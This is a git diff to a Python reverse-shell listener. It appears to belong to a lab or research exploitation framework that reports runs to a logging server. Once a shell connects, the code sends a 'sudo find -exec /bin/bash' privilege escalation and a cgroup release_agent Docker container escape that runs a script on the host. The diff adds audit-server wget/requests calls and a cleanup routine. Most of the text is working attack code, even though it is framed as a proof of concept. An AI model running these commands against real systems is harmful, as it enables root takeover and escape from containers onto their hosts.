@@ -5,7 +5,7 @@ import threading
 # I utilized as base code for this listener the code found on:
 # https://tpetersonkth.github.io/2021/10/16/Creating-a-Basic-Python-Reverse-Shell-Listener.html
 
-def listen(ip, port):
+def listen(ip, port, general_info):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
@@ -13,15 +13,21 @@ def listen(ip, port):
 	conn, addr = s.accept()
 	try:
 		print('Connection received from ',addr)
+		
+		# Inform the Logging server
+		start = '\n'
+		if general_info['active'] == 'True':
+			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
+		
 		# Commands in order to get root access
 		# In order to escalate privilege we will assume the docker has permission to run sudo find (simulating a, not so likely but possible, vulnerability)
-		escalation = ['cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
+		escalation = [start, 'cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
 		for cmd in escalation:
 			# Avoid stalling for ever
 			conn.settimeout(1.0)
 			try:
 				ans = conn.recv(4194304).decode()
-				sys.stdout.write(ans)
+				#sys.stdout.write(ans)
 			except socket.timeout:
 				# This will happen once we open the root shell because the input will be empty
 				pass
@@ -29,7 +35,7 @@ def listen(ip, port):
 			conn.settimeout(None)
 			conn.send(cmd.encode())
 			time.sleep(0.30)
-			sys.stdout.write("\033[A" + ans.split("\n")[-1])
+			#sys.stdout.write("\033[A" + ans.split("\n")[-1])
 		# Whatever you put inside the $dir/escapingDocker script will be executed on the host
 		# with high privileges
 		escape= ['rm -drf /tmp/cgroup_mount/ >/dev/null 2>&1\n',
@@ -44,10 +50,10 @@ def listen(ip, port):
 			 '''echo 'echo "PoC, injected through the container" > /File_on_Host' >> /escapingDocker\n''',
 			 'chmod a+x /escapingDocker\n',
 			 'sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
-
+		print("\n\n\n[*] Executing Exploit, please wait")
 		for cmd in escape:
 			# Avoid stalling for ever
-			conn.settimeout(1.0)
+			conn.settimeout(0.6)
 			try:
 				ans = conn.recv(4194304).decode()
 				# sys.stdout.write(ans) # We could print the output but it won't show much, other than possible errors that most likely dont affect the result 
@@ -60,13 +66,14 @@ def listen(ip, port):
 			time.sleep(0.30)
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
 		
-		print('[+] Exploit completed, if the container was vulnerable, your exploit was executed')
-		print('[+] Exiting the script...')
+		print('\n\n[+] Exploit completed, if the container was vulnerable, your exploit was executed')
+		print('[+] Exiting the script...\n\n')
+		cleanup(conn, general_info)
 	
 	except KeyboardInterrupt:
 		if conn:
 			print('\n[-] Unbinding...')
-			# Possible cleanup here
+			cleanup(conn, general_info)
 			time.sleep(0.2)
 			conn.close()
 			s.close()
@@ -80,7 +87,7 @@ def listen_shell(victim_info, attacker_info, general_info):
 		r_port = random.randint(1024, 65536)
 	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port']))
 	get_access.start() # Access the page that contains the reverse shell in order to establish connection
-	listen(attacker_info['ip'],int(attacker_info['port']))
+	listen(attacker_info['ip'],int(attacker_info['port']), general_info)
 
 
 def task(v_ip, v_port):
@@ -114,18 +121,6 @@ def task(v_ip, v_port):
 		sys.exit()
 		
 			
-def recvall(sock):
-	BUFF_SIZE = 4096 # 4 KiB
-	data = ''
-	while True:
-		time.sleep(0.07)
-		part = sock.recv(BUFF_SIZE).decode()
-		data += part
-		if len(part) < BUFF_SIZE:
-		# either 0 or end of data
-			break
-	return data
-	
 def check_port(ip, port):
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -142,3 +137,27 @@ def check_port(ip, port):
 	return False
 
 	s.close()
+
+def cleanup(conn, general_info):
+	conn.send('umount /tmp/cgroup_mount && rm -drf /tmp/cgroup_mount\n'.encode())
+	if general_info['active'] == 'True':
+		try:
+			# The pid here is random, we dont really to specify it
+			requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
+		except requests.exceptions.ReadTimeout:
+		    		pass
+		except requests.exceptions.ConnectTimeout:
+		    	sys.exit('[-] Failed to connect to Logging server')
+
+
+def informAudittingStart(general_info):
+	exploit = 'Docker'
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
+	return url
+
+def informAudittingStop(general_info):
+	exploit = 'Docker'
+	# Pid is added on the terminal using $(echo $$)
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
+	return url
